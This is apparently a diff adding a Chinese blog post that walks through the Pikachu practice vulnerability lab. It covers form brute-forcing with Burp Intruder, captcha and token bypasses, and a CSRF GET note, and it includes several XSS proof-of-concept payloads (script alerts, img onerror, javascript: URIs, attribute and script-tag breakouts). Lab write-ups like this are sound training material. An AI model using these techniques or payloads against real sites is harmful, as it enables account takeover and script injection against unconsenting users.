@@ -1,0 +1,898 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+<!-- keywords -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Huaji">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Huaji">
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    <meta name="description" content="搞到现在总算有个博客了">
+    <meta name="description" content="Pikachu靶场一直忘了刷这个靶场了，国庆结束想起来做一下，内容都非常基础所以写的比较简单，没有别的大佬的博客内容写的清晰。 暴力破解基于表单的暴力破解发现&#x2F;vul&#x2F;burteforce&#x2F;bf_form.php是提交用的，post请求体里有username&#x3D;123&amp;password&#x3D;123&amp;submit&#x3D;Login，所以扔到burpsuite里的in">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pikachu">
+<meta property="og:url" content="http://huajihd.github.io/2025/11/09/Pikachu/index.html">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="Pikachu靶场一直忘了刷这个靶场了，国庆结束想起来做一下，内容都非常基础所以写的比较简单，没有别的大佬的博客内容写的清晰。 暴力破解基于表单的暴力破解发现&#x2F;vul&#x2F;burteforce&#x2F;bf_form.php是提交用的，post请求体里有username&#x3D;123&amp;password&#x3D;123&amp;submit&#x3D;Login，所以扔到burpsuite里的in">
+<meta property="og:locale">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933727.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933728.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933729.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933731.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933732.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933733.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933734.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933735.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933736.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933737.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933738.png">
+<meta property="article:published_time" content="2025-11-09T14:28:16.000Z">
+<meta property="article:modified_time" content="2025-11-09T14:28:34.195Z">
+<meta property="article:author" content="Huaji">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933727.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    <title>Pikachu · Huajiの小窝</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .footer-fixed-btn,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(
+            -45deg,
+            #444 0,
+            #444 80px,
+            #333 80px,
+            #333 160px
+        );
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
+    <link id="stylesheet-theme-dark" rel="preload" href="/css/dark.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    <!-- 百度统计  -->
+    <!-- 谷歌统计  -->
+    <!-- Google tag (gtag.js) -->
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+        <body class="post-body">
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        <div class="header-sidebar-menu">
+            <div style="padding-left: 1px;">&#xe775;</div>
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href="/">Huajiの小窝.</a>
+        </span>
+    </div>
+    <!-- toggle banner -->
+    <div class="banner">
+        <div class="blog-title header-element">
+            <a href="/">Huajiの小窝.</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">Pikachu</a>
+        </div>
+    </div>
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- donate button -->
+
+    <!-- back to top button -->
+    <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
+        <div>&#xe639;</div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="    height:50vh;
+">
+    <!-- 主页  -->
+    <!-- 404页  -->
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+                Pikachu
+            <!-- 404 -->
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            <!-- 404 -->
+        </p>
+        <!-- 文章页 meta -->
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                    <div class="post-intro-tags" >
+        <a class="post-tag" href="javascript:void(0);" data-tags="web">web</a>
+</div>
+
+                <!-- 文章字数统计 -->
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2025/11/09</span>
+                    <!-- busuanzi -->
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Pikachu靶场"><a href="#Pikachu靶场" class="headerlink" title="Pikachu靶场"></a>Pikachu靶场</h1><p>一直忘了刷这个靶场了，国庆结束想起来做一下，内容都非常基础所以写的比较简单，没有别的大佬的博客内容写的清晰。</p>
+<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h4 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h4><p>发现&#x2F;vul&#x2F;burteforce&#x2F;bf_form.php是提交用的，post请求体里有<code>username=123&amp;password=123&amp;submit=Login</code>，所以扔到burpsuite里的intruder直接爆破即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933727.png" alt="image-20251008212015930" style="zoom: 17%;" /><img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933728.png" alt="image-20251008212121258" style="zoom:20%;" /></p>
+<h4 id="验证码绕过-onserver）"><a href="#验证码绕过-onserver）" class="headerlink" title="验证码绕过(onserver）"></a>验证码绕过(onserver）</h4><p>输入验证码后发现验证码长期有效，所以内容应该同<strong>基于表单的暴力破解</strong>中的内容。</p>
+<h4 id="验证码绕过-onclient"><a href="#验证码绕过-onclient" class="headerlink" title="验证码绕过(onclient)"></a>验证码绕过(onclient)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> code; <span class="comment">//在全局 定义验证码</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">createCode</span>(<span class="params"></span>) &#123;</span><br><span class="line">        code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> codeLength = <span class="number">5</span>;<span class="comment">//验证码的长度</span></span><br><span class="line">        <span class="keyword">var</span> checkCode = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;checkCode&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> selectChar = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>);<span class="comment">//所有候选组成验证码的字符，当然也可以用中文的</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; codeLength; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> charIndex = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">36</span>);</span><br><span class="line">            code += selectChar[charIndex];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//alert(code);</span></span><br><span class="line">        <span class="keyword">if</span> (checkCode) &#123;</span><br><span class="line">            checkCode.<span class="property">className</span> = <span class="string">&quot;code&quot;</span>;</span><br><span class="line">            checkCode.<span class="property">value</span> = code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">validate</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> inputCode = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#bf_client .vcode&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">        <span class="keyword">if</span> (inputCode.<span class="property">length</span> &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;请输入验证码！&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (inputCode != code) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;验证码输入错误！&quot;</span>);</span><br><span class="line">            <span class="title function_">createCode</span>();<span class="comment">//刷新验证码</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="title function_">createCode</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现只有前端对验证码进行校验，所以可以直接忽略掉，内容也与<strong>基于表单的暴力破解</strong>中相同。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933729.png" alt="image-20251008213358020"></p>
+<h4 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破?"></a>token防爆破?</h4><p>抓包，发现请求体中多了一个token参数，所以又观察到在html表单中有一个隐藏的token，所以考虑用pitchfork，</p>
+<p>修改token的payload，点击设置里的<code>Grep—Extract</code>的添加（中文应该是叫检索-提取），然后点击获取回复，选中token的值复制，然后点击OK，之后输入初始值</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933731.png" alt="image-20251008231706988" style="zoom:20%;" /><img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933732.png" alt="image-20251008231751614" style="zoom:18%;" /></p>
+<p>启动即可</p>
+<h2 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross-Site Scripting"></a>Cross-Site Scripting</h2><p>XSS原理不解释，自行查找</p>
+<h4 id="反射型XSS-get）"><a href="#反射型XSS-get）" class="headerlink" title="反射型XSS(get）"></a>反射型XSS(get）</h4><p><strong>src不收</strong></p>
+<p>先在前端修改输入框的最大长度限制，然后提交下方内容即可，这个是get传参</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="反射型XSS-post"><a href="#反射型XSS-post" class="headerlink" title="反射型XSS(post)"></a>反射型XSS(post)</h4><p><strong>src不收</strong></p>
+<p>先用弱密码登录， admin&#x2F;123456，之后里面有个submit，提交下方内容即可，这个是post传参</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>好用，影响很严重。</p>
+<p>题目都没有waf，所以很好操作，可以用XSS钓鱼</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4><p>分析一下前端网页代码，可以发现输入框里的参数会被传递给A标签的href属性，输入下方内容提交，之后点击链接即可触发</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="DOM型XSS-X"><a href="#DOM型XSS-X" class="headerlink" title="DOM型XSS-X"></a>DOM型XSS-X</h4><p>DOM型XSS-X危害比DOM型XSS更大，可以在URL中体现</p>
+<p>看到源码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;script&gt;</span><br><span class="line">                    <span class="keyword">function</span> <span class="title function_">domXSS</span>(<span class="params"></span>)&#123;</span><br><span class="line">                        <span class="keyword">var</span> str = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>;</span><br><span class="line">                        <span class="keyword">var</span> tXSS = <span class="built_in">decodeURIComponent</span>(str.<span class="title function_">split</span>(<span class="string">&quot;text=&quot;</span>)[<span class="number">1</span>]);</span><br><span class="line">                        <span class="keyword">var</span> <span class="variable constant_">XSS</span> = tXSS.<span class="title function_">replace</span>(<span class="regexp">/\+/g</span>,<span class="string">&#x27; &#x27;</span>);</span><br><span class="line"><span class="comment">//                        alert(XSS);</span></span><br><span class="line"></span><br><span class="line">                        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dom&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+<span class="variable constant_">XSS</span>+<span class="string">&quot;&#x27;&gt;就让往事都随风,都随风吧&lt;/a&gt;&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</span></span><br><span class="line">                    <span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;,闭合掉就行</span></span><br><span class="line">                &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现是<code>js</code>函数利用了<code>DOM</code>将字符串拼接并把值赋给a标签的href，然后输出一个<code>就让往事都随风,都随风吧</code>，所以我们先给href拼接上，然后再写个onclick1就能0你实现</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#<span class="string">&#x27; onclick=&quot;alert(111)&quot;&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h4><p>只是因为显示不出来，但是后台能看见，如果盲打的话可以偷偷操控某些控件，<del>比如实现自动提交？</del></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h4><p>换个标签即可，这个在<code>XSS cheatshee</code>t里很多</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=xx onerror=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h4><p><code>specialchars</code>这个函数会把单引号，双引号，尖括号过滤了，但是这个函数默认是不过滤单引号的，只有将quotestyle选项为ENT_QUOTES才会过滤单引号。</p>
+<p>发现正常的内容会被放到href里面，所以输入</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h4><p>没懂和<strong>htmlspecialchars</strong>考点有什么区别</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="XSS之js输出"><a href="#XSS之js输出" class="headerlink" title="XSS之js输出"></a>XSS之js输出</h4><p>要先把之前的script闭合</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h4 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h4><img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933733.png" alt="image-20251009161713483" style="zoom:25%;" />
+
+<p>抓包可以发现get请求里有修改信息的内容，篡改参数后欺骗用户点击即可</p>
